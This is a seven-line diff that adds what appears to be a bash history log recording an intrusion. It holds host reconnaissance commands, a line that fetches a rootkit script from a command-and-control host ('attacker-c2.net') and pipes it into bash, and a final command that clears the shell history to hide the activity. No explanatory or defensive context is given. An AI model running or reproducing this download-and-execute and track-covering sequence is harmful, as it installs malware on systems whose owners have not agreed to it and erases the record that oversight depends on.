@@ -1,0 +1,7 @@
+whoami
+id
+uname -a
+#1762488100
+curl -s http://attacker-c2.net/lin_rootkit.sh | bash
+#1762488200
+history -c
